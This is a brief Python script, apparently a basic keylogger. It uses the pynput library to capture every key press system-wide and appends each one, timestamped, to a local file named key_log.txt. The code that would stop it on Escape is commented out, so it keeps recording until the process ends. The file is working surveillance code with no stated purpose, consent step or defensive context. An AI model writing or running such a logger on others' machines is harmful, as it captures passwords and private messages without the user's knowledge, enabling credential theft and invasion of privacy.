from pynput.keyboard import Key, Listener
import logging

#make a log file
log_dir = ""

logging.basicConfig(filename=("key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
    logging.info(str(key))
    #if key == Key.esc:
        #return False
with Listener(on_press=on_press) as listener:
    listener.join()